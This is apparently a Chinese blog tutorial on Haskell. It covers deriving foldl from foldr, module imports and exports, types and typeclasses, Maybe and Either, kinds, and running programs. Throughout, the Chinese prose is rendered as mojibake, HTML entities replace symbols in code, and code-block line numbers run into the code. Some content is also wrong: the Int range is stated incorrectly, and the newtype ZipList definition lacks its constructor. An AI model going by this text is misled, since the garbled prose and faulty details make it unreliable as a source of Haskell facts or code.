ä¸éš¾å‘ç°ï¼ŒåŸå¼ (foldr (â€¦) id xs) z ç­‰ä»·äºï¼š (foldr (...) id xs') (f z x1) è·Ÿç€è¿™ä¸ªæ€è·¯ï¼Œxsæ¯æ¬¡å°‘ä¸€ä¸ªå¼€å¤´çš„å…ƒç´ xâ€™ï¼Œzæ¯æ¬¡å˜æ¢æˆä¸º f z xâ€™å› æ­¤ä¸‹ä¸€æ­¥ï¼š 12345 (\\x g y -&gt; g (f y x)) x1 (foldr (...) id xs') z= (foldr (...) id xs') (f z x1)= (foldr (...) id xs'') (f (f z x1) x2)= (foldr (...) id xs''') (f (f (f z x1) x2) x3)= ... å¯ä»¥å‘ç°ï¼Œå·²ç»æœ‰äº†è§„å¾‹ã€‚é‚£ä¹ˆæœ€ç»ˆåœæ­¢æ—¶æ˜¯ä»€ä¹ˆæ ·å‘¢ï¼Ÿ æœ€ååˆ°äº†ä¸èƒ½åœ¨å±•å¼€æ—¶ï¼Œæœ€å‰é¢çš„ foldr (â€¦) id xs å·²ç»å˜æˆäº† foldr (â€¦) id []è€Œæ ¹æ®å‰é¢foldrçš„å®šä¹‰ foldr _ x [] = x ï¼Œå®ƒåº”è¯¥è¿”å›id æ‰€ä»¥æœ€åçš„ç»“æœï¼š(idçš„å®šä¹‰ï¼šid x = x) 1234567 ...= (foldr (...) id xs') (f z x1)= (foldr (...) id xs'') (f (f z x1) x2)= ...= (foldr (...) id []) (f (.. (f z x1) ..) xn)= id (f (.. (f z x1) ..) xn)= f (.. (f z x1) ..) xn é‚£ä¹ˆæœ€åè¿™ä¸ªç»“æœå°±å¾ˆç†Ÿæ‚‰äº†ï¼Œå®ƒå°±æ˜¯ foldl f z xsã€‚æ‰€ä»¥æˆ‘ä»¬æ¨å¯¼å‡ºäº†è¿™ä¸ªç”¨foldrè¡¨ç¤ºfoldlçš„å†™æ³•æ˜¯æ­£ç¡®çš„ã€‚ ModulesHaskellä¼šè‡ªåŠ¨åŠ è½½Preludeæ¨¡å—ï¼ˆmoduleï¼‰ï¼Œå¦‚æœåœ¨GHCiä¸­å†åŠ è½½å…¶ä»–æ¨¡å—ï¼Œéœ€è¦ä½¿ç”¨:m + ...ï¼Œæ¯”å¦‚åŠ è½½Data.Listæ¨¡å—ï¼š Prelude> :m + Data.List è€Œåœ¨hsæ–‡ä»¶ä¸­å¼•å…¥æ¨¡å—ï¼Œéœ€è¦ä½¿ç”¨importè¯­å¥ï¼Œä¸‹é¢å’Œpythonçš„å¯¹æ¯”å¯ä»¥ä¾¿äºç†è§£ï¼š 1234567891011121314import Data.List-- from Data.List import *import Data.List (nub, sort)-- from Data.List import nub, sortimport Data.List hiding (nub)-- ä»Data.Listä¸­å¼•å…¥æ‰€æœ‰ï¼Œä½†ä¸å¼•å…¥nubå‡½æ•°import qualified Data.List-- import Data.Listimport qualified Data.List as Li-- import Data.List as Li ç¼–å†™Modulesæ¨¡å—ä¸­è¦åŒ…å«å°†è¦ä½¿ç”¨çš„ä¸€äº›å‡½æ•°ï¼Œåƒæ­£å¸¸çš„hsæ–‡ä»¶ä¸€æ ·å†™å³å¯ï¼Œä½†å¤´éƒ¨éœ€è¦æœ‰å¯¼å‡ºè¯­å¥ï¼ˆexportï¼‰ã€‚æ¯”å¦‚ä¸€ä¸ªæ¨¡å—æ–‡ä»¶åå«ModuleA.hsï¼Œé‚£å®ƒçš„å¤´éƒ¨éœ€è¦å†™ï¼š 123456module ModuleA( functionA, functionB, functionC) where è€Œä¸”æ–‡ä»¶ä¸­çš„æ‰€æœ‰å‡½æ•°åªå¯¼å‡ºéœ€è¦ä½¿ç”¨çš„å³å¯ã€‚æ¯”å¦‚è¯¥æ–‡ä»¶ä¸­è¿˜å«æœ‰functionDä¾›å‰ä¸‰ä¸ªå‡½æ•°å†…éƒ¨ä½¿ç”¨ï¼Œé‚£ä¹ˆåœ¨import ModuleAä¹‹åä¹Ÿæ— æ³•è°ƒç”¨functionDã€‚ Types &amp; TypeclassesTypesHaskellæœ‰ä¸€ä¸ªé™æ€ç±»å‹ç³»ç»Ÿï¼Œä»»ä½•å˜é‡ã€å‡½æ•°éƒ½ä¼šå…·æœ‰ç±»å‹ï¼Œå¹¶ä¸”æœ‰ç±»å‹åˆ¤æ–­åŠŸèƒ½ï¼Œæ²¡ç»™å‡ºçš„ç±»å‹ä¼šè‡ªåŠ¨è¯†åˆ«ã€‚Typeçš„é¦–å­—æ¯å…¨ä¸ºå¤§å†™ï¼Œå¸¸ç”¨çš„æœ‰ï¼š Intï¼šæ•´å‹ï¼Œæœ‰ä¸Šä¸‹ç•ŒèŒƒå›´ï¼Œ-2147483647ï½2147483648 Integerï¼šæ•´æ•°ï¼Œæ— ç•Œï¼Œä½†æ˜¯æ•ˆç‡æ¯”Intä½ Floatï¼šå•ç²¾åº¦æµ®ç‚¹å‹ Doubleï¼šåŒç²¾åº¦æµ®ç‚¹å‹ Boolï¼šå¸ƒå°”å€¼ Charï¼šå­—ç¬¦ Stringï¼šå­—ç¬¦ä¸²ï¼Œç­‰åŒäº[Char] Orderingï¼šå¤§å°å…³ç³»ï¼ŒåŒ…å«LTã€EQã€GTï¼Œä¸”å®ƒä»¬æœ‰å¤§å°å…³ç³» LT &lt; EQ &lt; GT åˆ—è¡¨çš„ç±»å‹æ˜¯ç”±å…¶ä¸­å…ƒç´ å†³å®šçš„ï¼Œå¹¶ä¸”åˆ—è¡¨ä¸­å…ƒç´ å¿…é¡»æ˜¯åŒä¸€ç±»å‹ï¼Œæ‰€ä»¥åˆ—è¡¨çš„ç±»å‹å°±æ˜¯å…¶å…ƒç´ ç±»å‹å¤–åŠ []ã€‚ å…ƒç»„çš„ç±»å‹ç”±å…¶ä¸­å„ä¸ªå…ƒç´ çš„ç±»å‹å…±åŒå†³å®šï¼Œå› ä¸ºå…ƒç»„ä¸­çš„å…ƒç´ å¯ä»¥æ˜¯ä¸åŒç±»å‹ã€‚å¦‚(â€œabcâ€, â€˜aâ€™, True)çš„ç±»å‹æ˜¯([Char], Char, Bool)ã€‚ Typeclassesç±»å‹ç±»ï¼ˆTypeclassï¼‰æ˜¯å®šä¹‰ä¸€ç³»åˆ—åŠŸèƒ½çš„æ¥å£ï¼Œå¦‚æœä¸€ä¸ªTypeå±äºä¸€ä¸ªTypeclassçš„æˆå‘˜ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥å®ç°è¿™ä¸ªç±»å‹ç±»æ‰€è§„å®šçš„åŠŸèƒ½ã€‚ä¸€ä¸ªTypeä¹Ÿå¯ä»¥å±äºå¤šä¸ªTypeclassTypeclassçš„é¦–å­—æ¯ä¹Ÿå…¨ä¸ºå¤§å†™ï¼Œå¸¸è§çš„æœ‰ï¼š Eqï¼šå¯åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ Ordï¼šå¯æ¯”è¾ƒå¤§å° Showï¼šå¯å±•ç¤ºæˆå­—ç¬¦ä¸² Readï¼šå¯ä»å­—ç¬¦ä¸²è½¬æ¢æˆç‰¹å®šç±»å‹ Enumï¼šå¯æšä¸¾ï¼ˆè¿ç»­ï¼‰ï¼Œå³å¯ä»¥ä½¿ç”¨predå’Œsuccå‡½æ•°å¾—åˆ°å‰é©±å’Œåç¼€ Bounded: æœ‰ä¸Šä¸‹ç•Œï¼Œå¦‚æœå…ƒç»„ä¸­æ‰€æœ‰å…ƒç´ éƒ½å±äºBoundedï¼Œé‚£è¿™ä¸ªå…ƒç»„çš„ç±»å‹ä¹Ÿå±äºBounded Integralï¼šæ˜¯æ•´æ•°ï¼ŒåŒ…æ‹¬Intå’ŒInteger RealFloatï¼š æ˜¯å®æµ®ç‚¹æ•°ï¼ŒåŒ…æ‹¬Floatå’ŒDouble RealFracï¼šæ˜¯å®åˆ†æ•°ï¼ŒåŒ…æ‹¬Floatã€Doubleå’ŒRatioï¼ˆåœ¨Data.Ratioæ¨¡å—ä¸­ï¼‰ Floatingï¼šæ˜¯æµ®ç‚¹æ•°ï¼ŒåŒ…æ‹¬Floatã€Doubleå’ŒComplexï¼ˆåœ¨Data.Complexæ¨¡å—ä¸­ï¼‰ Realï¼šæ˜¯å®æ•°ï¼ŒåŒ…æ‹¬Integralå’ŒRealFracçš„æˆå‘˜ Fractionalï¼šæ˜¯åˆ†æ•°ï¼ŒåŒ…æ‹¬RealFracå’ŒFloatingçš„æˆå‘˜ Numï¼šæ˜¯æ•°å­—ï¼ŒåŒ…æ‹¬ä¸Šè¿°æ‰€æœ‰æ•°å­—ç›¸å…³çš„ç±»å‹ Type variableså¦‚æœæŸ¥çœ‹ä¸€ä¸ªå‡½æ•°çš„ç±»å‹ï¼Œæ¯”å¦‚headï¼Œé‚£ä¹ˆå°†ä¼šè¿”å›ä»¥ä¸‹ç±»å‹ï¼š head :: [a] -> a å…¶ä¸­çš„aå°±æ˜¯ä¸€ä¸ªç±»å‹å˜é‡ï¼ˆtype variableï¼‰ï¼Œå®ƒåœ¨headä¸­å¯ä»¥å±äºä»»ä½•ç±»å‹ï¼Œåœ¨è¿™é‡Œåªæ˜¯è¡¨ç¤ºè¿”å›å€¼çš„ç±»å‹å’Œè¾“å…¥çš„åˆ—è¡¨ä¸­çš„å…ƒç´ çš„ç±»å‹ç›¸ä¸€è‡´ã€‚ åœ¨å‡½æ•°çš„ç±»å‹è¡¨è¾¾å¼å…¶å®å¯ä»¥çœ‹ä½œ$\\lambda$è¡¨è¾¾å¼ï¼Œå®ƒé€‚ç”¨äº$\\alpha$å˜æ¢ï¼ˆ$\\alpha$-conversionï¼‰ã€‚å³aåœ¨è¿™é‡Œå¯ä»¥æŒ‡Intã€Charç­‰ç±»å‹ï¼Œä¹Ÿå¯ä»¥æŒ‡[Char], (Int, Char), ç”šè‡³å‡½æ•°Int -&gt; Intç­‰ã€‚ åœ¨å¤§éƒ¨åˆ†å‡½æ•°çš„ç±»å‹ä¸­ï¼Œç±»å‹å˜é‡éœ€è¦ä¿è¯æ˜¯æŸä¸ªTypeclassçš„æˆå‘˜æ‰èƒ½å®Œæˆæ“ä½œã€‚æ¯”å¦‚(==)å‡½æ•°ï¼Œå®ƒéœ€è¦ä¼ å…¥çš„å‚æ•°æ˜¯å¯åˆ¤æ–­ç›¸ç­‰çš„ï¼Œå³æ˜¯Eqçš„æˆå‘˜ï¼Œé‚£ä¹ˆ(==)çš„ç±»å‹å°±æ˜¯ï¼š (==) :: (Eq a) => a -> a -> Bool å…¶ä¸­=&gt;å‰çš„éƒ¨åˆ†(Eq a)å°±æ˜¯ç±»çº¦æŸï¼ˆclass constraintï¼‰ï¼Œå®ƒè§„å®šäº†aæ˜¯Eqçš„æˆå‘˜ï¼Œæ‰€ä»¥(==)å‡½æ•°ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯aç±»å‹ï¼Œä¸”éƒ½æ˜¯Eqçš„æˆå‘˜ï¼Œä¿è¯äº†å®ƒä»¬ä¹‹é—´æ˜¯å¯ä»¥æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰çš„ã€‚ å®šä¹‰æ–°Typeå®šä¹‰ä¸€ä¸ªæ–°çš„Typeéœ€è¦ä½¿ç”¨dataå…³é”®å­—ï¼Œæ¯”å¦‚å®šä¹‰Booléœ€è¦ä½¿ç”¨ï¼š data Bool = False | True å…¶ä¸­=å·¦ä¾§çš„éƒ¨åˆ†å®šä¹‰äº†æ–°ç±»å‹çš„åç§°Boolï¼Œå³ä¾§çš„éƒ¨åˆ†å«åšå€¼æ„é€ å™¨ï¼ˆvalue constructorsï¼‰ï¼Œè¡¨ç¤ºäº†Boolç±»å‹çš„å€¼ä¸ºFalseæˆ–Trueã€‚å¹¶ä¸”åç§°å’Œå€¼æ„é€ å™¨çš„é¦–å­—æ¯éƒ½éœ€è¦å¤§å†™ã€‚ å¦å¤–ï¼Œå€¼æ„é€ å™¨ä¹Ÿæ˜¯å‡½æ•°ï¼Œå®ƒä»¬å¯ä»¥æœ‰å‚æ•°ï¼Œå«åšé¡¹ï¼ˆfieldï¼‰ã€‚æ¯”å¦‚ï¼š 1data Shape = Circle Float Float Float | Rectangle Float Float Float Float å®ƒå®šä¹‰äº†ä¸€ä¸ªæ–°Typeå«Shapeï¼Œå€¼æ„é€ å™¨æ˜¯Circleå’ŒRectangleï¼ŒCircleæ¥æ”¶ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯Floatç±»å‹ï¼ŒRectangleæ¥æ”¶å››ä¸ªFloatç±»å‹å‚æ•°ã€‚å¦‚æœæŸ¥çœ‹Circleçš„ç±»å‹ï¼Œå°†è¿”å›ï¼š Circle :: Float -> Float -> Float -> Shape å¦‚æœæƒ³è¦è®©å®ƒèƒ½ç»™ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œéœ€è¦è®©å®ƒå±äºShowç±»å‹ç±»ã€‚åœ¨ä»£ç ä¸­åªéœ€è¦åœ¨ç»“å°¾åŠ ä¸Šderiving (Show): 1data Shape = Circle Float Float Float | Rectangle Float Float Float Float deriving (Show) ç±»å‹çš„åç§°å’Œå€¼æ„é€ å™¨åç§°ä¹Ÿå¯ä»¥ç›¸åŒï¼Œæ¯”å¦‚ï¼š 1data Point = Point Float Float deriving (Show) å¯¼å‡ºTypeåœ¨æ–‡ä»¶ä¸­å®šä¹‰äº†æ–°çš„Typeä¹‹åï¼Œå¦‚æœåœ¨åˆ«çš„æ–‡ä»¶ä¸­å°†å…¶ä½œä¸ºæ¨¡å—å¯¼å…¥ï¼Œåˆ™éœ€è¦å…ˆå¯¼å‡ºã€‚æ¯”å¦‚æ–‡ä»¶Shapes.hsä¸­å®šä¹‰äº†Shapeå’ŒPointï¼Œä»¥åŠå…¶ä»–çš„ä¸€äº›å‡½æ•°ï¼Œé‚£ä¹ˆæ–‡ä»¶å¼€å¤´éœ€è¦å†™ï¼š 123456module Shapes( Shape(..), Point(..), functionA, functionB) where å…¶ä¸­çš„Shape(..)å¯¼å‡ºäº†Shapeç±»å‹å’Œå®ƒæ‰€æœ‰çš„å€¼æ„é€ å™¨ï¼Œ..ä»£è¡¨äº†å®ƒçš„æ‰€æœ‰å€¼æ„é€ å™¨ã€‚å› æ­¤ï¼ŒShape(..)ç›¸å½“äºShape (Circle, Rectangle)ã€‚ å¦‚æœä¸æƒ³è¦å¯¼å‡ºå€¼æ„é€ å™¨ï¼Œå³ä¸å…è®¸ä½¿ç”¨å€¼æ„é€ å™¨çš„æ–¹æ³•æ¥åˆ›å»ºShapeç±»å‹çš„å˜é‡ã€‚é‚£ä¹ˆéœ€è¦å°†Shape(..)æ›¿æ¢ä¸ºShapeï¼Œè¿™æ ·å°±åªå¯¼å‡ºäº†Shapeç±»å‹ï¼Œè€Œä¸å¯¼å‡ºå…¶å€¼æ„é€ å™¨ã€‚ Record Syntaxå¦‚æœæƒ³è¦æ–¹ä¾¿åœ°å–å‡ºç±»å‹å®ä¾‹ä¸­çš„å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨Recordè¯­æ³•ï¼Œå¦‚ï¼š 123data Point = Point { xcoord :: Float , ycoord :: Float } deriving (Show) åœ¨å€¼æ„é€ å™¨çš„å‚æ•°éƒ¨åˆ†å…ˆåŠ ä¸€ä¸ªå¤§æ‹¬å·ï¼Œç„¶åæŒ‡å®šå–å‡ºå€¼çš„å‡½æ•°åç§°ï¼ˆxcoord, ycoordï¼‰ï¼Œåé¢æŒ‡å®šç±»å‹ï¼ˆ:: Floatï¼‰ã€‚è¿™æ ·xcoordå’Œycoordå°±éƒ½æ˜¯ä¸€ä¸ªç±»å‹ä¸ºPoint -&gt; Floatçš„å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢æ–¹æ³•æ¥è®¿é—®å€¼ï¼š 12345ghci&gt; let point = Point 1.0 2.0ghci&gt; xcoord point1.0ghci&gt; ycoord point2.0 åŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡ä¸‹é¢æ–¹æ³•æ¥åˆ›å»ºè¿™ä¸ªpointï¼š 1point = Point {ycoord=2.0, xcoord=1.0} Type parameterså€¼æ„é€ å™¨å¯ä»¥æ¥æ”¶å‚æ•°ï¼Œç±»å‹ä¹Ÿå¯ä»¥æ¥æ”¶å‚æ•°ï¼Œè¿™æ ·å®ƒå°±æˆä¸ºäº†ç±»å‹æ„é€ å™¨ï¼ˆtype constructorsï¼‰ã€‚å¦‚Maybeçš„å®šä¹‰ï¼š data Maybe a = Nothing | Just a å®ƒçš„å€¼æ˜¯Nothingæ—¶ï¼Œç±»å‹ä¸ºMaybe aï¼Œæ˜¯å¤šæ€çš„ï¼ˆpolymorphicï¼‰ã€‚ä»–çš„å€¼ä¸æ˜¯Nothingæ—¶ï¼Œç±»å‹å–å†³äºå€¼Just aä¸­açš„ç±»å‹ï¼Œå¯ä»¥æ„é€ å‡ºMaybe Intã€Maybe [Char]ç­‰å¤šç§ç±»å‹ï¼š 1234Nothing :: Maybe aJust 1 :: Num a =&gt; Maybe aJust 'a' :: Maybe CharJust &quot;abc&quot; :: Maybe [Char] å¯ä»¥ç”¨è¿™ç§æ–¹æ³•æ”¹å†™Pointï¼š 123data Point x y = Point { xcoord :: x , ycoord :: y } deriving (Show) ä½†ä½¿ç”¨ç±»å‹å‚æ•°ï¼ˆtype parametersï¼‰å¹¶ä¸æ˜¯æ€»æ˜¯æ–¹ä¾¿ï¼Œæ¯”å¦‚åœ¨å£°æ˜å‡½æ•°ç±»å‹çš„æ—¶å€™ä¸èƒ½åªä½¿ç”¨Pointæ¥è¡¨ç¤ºPointç±»å‹ï¼Œè€Œæ˜¯å¿…é¡»å†™æˆPoint Float Floatã€‚ è€Œä¸”ä¸èƒ½åœ¨å®šä¹‰ç±»å‹æ„é€ å™¨æ—¶æ·»åŠ ç±»çº¦æŸï¼ˆclass constraintï¼‰ï¼Œä¸ç„¶åœ¨ä¹‹åå£°æ˜å‡½æ•°ç±»å‹çš„æ—¶å€™ä¹Ÿéƒ½éœ€è¦æ·»åŠ ç±»çº¦æŸï¼Œå¦‚ï¼š 12data (Ord k) =&gt; Map k v = ... toList :: (Ord k) =&gt; Map k a -&gt; [(k, a)] EitherEitheræ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œå®ƒæœ‰ä¸¤ä¸ªå€¼æ„é€ å™¨ï¼Œå®šä¹‰æ˜¯ï¼š 1data Either a b = Left a | Right b deriving (Eq, Ord, Read, Show) å¦‚æœä½¿ç”¨äº†Leftï¼Œé‚£å®ƒçš„açš„ç±»å‹å°±æ˜¯å…·ä½“çš„ï¼›å¦‚æœä½¿ç”¨äº†Rightï¼Œé‚£å®ƒçš„bçš„ç±»å‹å°±æ˜¯å…·ä½“çš„ï¼š 12345678ghci&gt; Right 20 Right 20 ghci&gt; Left &quot;w00t&quot; Left &quot;w00t&quot; ghci&gt; :t Right 'a' Right 'a' :: Either a Char ghci&gt; :t Left True Left True :: Either Bool b Eitherå¯ä»¥çœ‹ä½œMaybeçš„è¡¥å……ï¼Œæ¯”å¦‚Maybeåœ¨ä½¿ç”¨æ—¶ï¼Œå‡ºç°å¼‚å¸¸å¯ä»¥è¿”å›Nothingï¼Œä½†åªæ˜¯ä¸€ä¸ªNothingï¼Œä¸åŒ…å«ä»»ä½•ä¿¡æ¯ï¼›ä½†EitheråŒ…å«å·¦å€¼å’Œå³å€¼ï¼Œæ­£å¸¸ç»“æœè¿”å›å³å€¼ï¼Œè€Œå‡ºç°å¼‚å¸¸å°±å¯ä»¥è¿”å›åŒ…å«é”™è¯¯ä¿¡æ¯çš„å·¦å€¼ï¼Œæ¯”å¦‚å®‰å…¨é™¤æ³•ï¼š 12345678safeDiv :: Int -&gt; Int -&gt; Maybe IntsafeDiv _ 0 = NothingsafeDiv x y = Just (x `div` y)ghci&gt; safeDiv 4 2Just 2ghci&gt; safeDiv 1 0Nothing è€Œä½¿ç”¨Eitherï¼š 12345678safeDiv :: Int -&gt; Int -&gt; Either String IntsafeDiv _ 0 = Left &quot;Divided by zero&quot;safeDiv x y = Right (x `div` y)ghci&gt; safeDiv 4 2Right 2ghci&gt; safeDiv 1 0Left &quot;Divided by zero&quot; Derived instancesæƒ³è¦ä½¿ä¸€ä¸ªå®šä¹‰çš„ç±»æ»¡è¶³æŸäº›Typeclassçš„éœ€æ±‚ï¼Œéœ€è¦ä»å…¶æ´¾ç”Ÿï¼ˆderiveï¼‰ï¼Œæ¯”å¦‚ï¼š 12data Day = Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday deriving (Eq, Ord, Show, Read, Bounded, Enum) è¿™æ ·Dayç±»å‹çš„å€¼ï¼ˆMondayï½Sundayï¼‰ä¹‹é—´å°±å¯ä»¥æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ï¼ˆä»Eqæ´¾ç”Ÿï¼‰ï¼Œæ¯”è¾ƒå¤§å°ï¼ˆä»Ordæ´¾ç”Ÿï¼Œå·¦ä¾§ä¸ºå°ï¼Œå³ä¾§ä¸ºå¤§ï¼‰ï¼Œæ˜¾ç¤ºæˆå­—ç¬¦ä¸²ï¼ˆä»Showæ´¾ç”Ÿï¼‰ï¼Œä»å­—ç¬¦ä¸²ä¸­è¯»å–ï¼ˆä»Readæ´¾ç”Ÿï¼‰ï¼ŒåŒ…å«è¾¹ç•Œï¼ˆä»Boundedæ´¾ç”Ÿï¼‰ï¼Œå¯ä»¥æšä¸¾ï¼ˆä»Enumæ´¾ç”Ÿï¼ŒæŒ‰ç…§å€¼æ„é€ å™¨ä¸­çš„é¡ºåºä¾æ¬¡å‘å³ï¼‰ Type synonymsä¸ºäº†é˜…è¯»æ–¹ä¾¿ï¼Œä¹¦å†™ç®€ä¾¿ï¼Œå¯ä»¥ä½¿ç”¨typeå…³é”®å­—ä¸ºå·²æœ‰ç±»å‹åˆ›å»ºåˆ«åï¼ˆsynonymsï¼‰ã€‚æ¯”å¦‚Stringçš„å®šä¹‰ï¼š type String = [Char] åœ¨æ‰€æœ‰éœ€è¦ä½¿ç”¨å­—ç¬¦ä¸²ï¼ˆå³[Char]ï¼‰çš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨Stringæ¥ä»£æ›¿ï¼Œå®ƒä»¬æ˜¯å®Œå…¨ä¸€è‡´çš„ï¼Œåªæ˜¯Stringæ›´ç®€ä¾¿æ˜“è¯»ã€‚åŒæ—¶ï¼Œç±»å‹åˆ«åä¹Ÿå¯ä»¥æ¥æ”¶ç±»å‹å‚æ•° newtype keywordé™¤äº†dataã€typeå…³é”®å­—ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ç”¨newtypeå…³é”®å­—æ¥å®šä¹‰ä¸€ä¸ªæ–°çš„ç±»å‹ï¼Œæ¯”å¦‚Control.Applicativeæ¨¡å—ä¸­çš„ZipListï¼š 1newtype ZipList a = { getZipList :: [a] } ä¸åŒäºtypeï¼Œå®ƒä¸æ˜¯åˆ«åï¼Œå¯ä»¥ä½¿ç”¨recordè¯­æ³•æ¥ç›´æ¥å®šä¹‰å–å‡ºå€¼çš„å‡½æ•° ä¸åŒäºdataï¼Œå®ƒåªèƒ½æœ‰ä¸€ä¸ªå€¼æ„é€ å™¨ï¼Œä½†æ˜¯é€Ÿåº¦è¦æ¯”dataå¿«ï¼Œè€Œä¸”æ›´åŠ æ‡’æƒ° Recursive data structuresä¸€ä¸ªç±»å‹ä¹Ÿå¯ä»¥é€’å½’å®šä¹‰ï¼Œæ¯”å¦‚ä¸€é¢—äºŒå‰æ ‘ï¼š 1data Tree a = EmptyTree | Node a (Tree a) (Tree a) deriving (Show, Read, Eq) å®šä¹‰æ–°Typeclasså®šä¹‰ä¸€ä¸ªæ–°çš„Typeclasséœ€è¦ä½¿ç”¨classå…³é”®å­—ï¼Œä¾‹å¦‚å®šä¹‰Eqç±»å‹ç±»ï¼š 12345class Eq a where (==) :: a -&gt; a -&gt; Bool (/=) :: a -&gt; a -&gt; Bool x == y = not (x /= y) x /= y = not (x == y) å…¶ä¸­aæ˜¯ä¸€ä¸ªç±»å‹å˜é‡ï¼Œå‰ä¸¤è¡Œå£°æ˜äº†éœ€è¦å®ç°çš„å‡½æ•°çš„åå­—åŠå…¶ç±»å‹ï¼Œåä¸¤è¡Œè¡¨æ˜äº†éœ€è¦çš„å‡½æ•°ä¹‹é—´å¯ä»¥ç›¸äº’å®šä¹‰ï¼ˆä¸å¿…è¦ï¼‰ã€‚ åŒ…å«äº†åä¸¤è¡Œä¹‹åï¼Œåªå®šä¹‰(==)å‡½æ•°æˆ–è€…(/=)å‡½æ•°éƒ½å¯ä»¥å®Œæˆå…¨éƒ¨å®šä¹‰ï¼Œå®ƒä»¬ï¼ˆ(==) | (/=)ï¼‰æˆä¸ºè¿™ä¸ªç±»å‹ç±»çš„æœ€å°å®Œæ•´å®šä¹‰ï¼ˆminimal complete definitionï¼‰ æŸ¥çœ‹ä¸€ä¸ªç±»å‹ç±»çš„æˆå‘˜éœ€è¦å®ç°çš„å‡½æ•°å¯ä»¥åœ¨GHCiä¸­ä½¿ç”¨:infoï¼š ghci> :info Eq æ‰‹åŠ¨åˆ›å»ºå®ä¾‹ä½¿ä¸€ä¸ªç±»å‹æˆä¸ºä¸€ä¸ªç±»å‹ç±»çš„å®ä¾‹å¯ä»¥ç›´æ¥ä½¿ç”¨derivingæ¥è‡ªåŠ¨å®Œæˆï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨instanceå…³é”®å­—æ¥æ‰‹åŠ¨å®Œæˆã€‚æ¯”å¦‚ä½¿Pointæˆä¸ºShowçš„å®ä¾‹ï¼š 123456instance Show Point where show (Point x y) = &quot;(&quot; ++ show x ++ &quot;, &quot; ++ show y ++ &quot;)&quot;-- in ghcighci&gt; Point 1.0 2.0(1.0, 2.0) è¿™æ ·å°±å¯ä»¥è‡ªå®šä¹‰æ˜¾ç¤ºçš„å†…å®¹ï¼Œå¦åˆ™ä½¿ç”¨derivingçš„è¯åªä¼šç›´æ¥å°†å…¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ã€‚ åŒæ—¶ä¹Ÿè¦æ³¨æ„ç±»å‹å’Œç±»å‹æ„é€ å™¨çš„åŒºåˆ«ï¼Œä¼ å…¥ç»™instanceçš„ç¬¬äºŒä¸ªå‚æ•°åº”è¯¥ä¸ºç±»å‹è€Œä¸æ˜¯ç±»å‹æ„é€ å™¨ï¼Œæ¯”å¦‚Maybeï¼š 123456789101112instance Eq Maybe where ... -- é”™è¯¯ç”¨æ³•ï¼Œå› ä¸ºMaybeæ˜¯ç±»å‹æ„é€ å™¨è€Œä¸æ˜¯ç±»å‹instance Eq (Maybe m) where ...-- é”™è¯¯ç”¨æ³•ï¼Œå› ä¸ºmä¸ä¸€å®šæ˜¯Eqçš„æˆå‘˜instance (Eq m) =&gt; Eq (Maybe m) where Just x == Just y = x == y Nothing == Nothing = True _ == _ = False Functor TypeclassFunctorä¹Ÿæ˜¯ä¸€ç§ç±»å‹ç±»ï¼Œå®ƒåªè§„å®šäº†ä¸€ä¸ªå‡½æ•°ï¼š 12class Functor f where fmap :: (a -&gt; b) -&gt; f a -&gt; f b å…¶ä¸­fæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå…·ä½“ç±»å‹ Kindsä¸€ä¸ªå€¼çš„ç±»å‹å«åšç±»å‹ï¼ˆTypeï¼‰ï¼Œè€Œä¸€ä¸ªç±»å‹çš„ç±»å‹å«åšKindã€‚å¯ä»¥é€šè¿‡GHCiä¸­:kæ¥æŸ¥çœ‹Kindï¼š 12345678ghci&gt; :k IntInt :: *ghci&gt; :k MaybeMaybe :: * -&gt; *ghci&gt; :k Maybe IntMaybe Int :: *ghci&gt; :k EitherEither :: * -&gt; * -&gt; * å…¶ä¸­çš„æ˜Ÿå·*ä»£è¡¨äº†ä¸€ä¸ªå…·ä½“ç±»å‹ï¼ˆconcrete typeï¼‰ã€‚Intæœ¬èº«å°±æ˜¯ä¸€ä¸ªå…·ä½“ç±»å‹ï¼Œæ‰€ä»¥Intçš„Kindæ˜¯*ã€‚è€ŒMaybeæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªå…·ä½“ç±»å‹è¿”å›ä¸€ä¸ªæ–°çš„å…·ä½“ç±»å‹ï¼Œæ‰€ä»¥Maybeçš„Kindæ˜¯* -&gt; *ã€‚å¦‚æœç»™Maybeä¼ å…¥äº†ä¸€ä¸ªIntï¼Œé‚£ä¹ˆå¾—åˆ°çš„Maybe Intå°±æ˜¯ä¸€ä¸ªå…·ä½“çš„ç±»å‹ï¼Œå®ƒçš„Kindå°±æ˜¯*ã€‚Eitherä¹Ÿæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œä½†å®ƒæ¥æ”¶ä¸¤ä¸ªç±»å‹æ‰äº§ç”Ÿä¸€ä¸ªæ–°çš„ç±»å‹ï¼Œæ‰€ä»¥Eitherçš„Kindæ˜¯* -&gt; * -&gt; *ã€‚ Input/Outputè¿è¡ŒHaskellç¨‹åºä¸åœ¨GHCiä¸­è¿è¡Œä¸€ä¸ªHaskellç¨‹åºæœ‰ä¸¤ç§æ–¹å¼ï¼š ç¼–è¯‘è¿è¡Œï¼š 12$ ghc --make code$ ./code é€šè¿‡runhaskellå‘½ä»¤ç›´æ¥è¿è¡Œï¼š 1$ runhaskell code.hs è¾“å‡ºæ–‡æœ¬åœ¨ä¸€ä¸ªHaskellç¨‹åºä¸­è¾“å‡ºæ–‡å­—éœ€è¦å®šä¹‰ä¸€ä¸ªmainå‡½æ•°ï¼š 1main = putStrLn &quot;Hello World&quot; 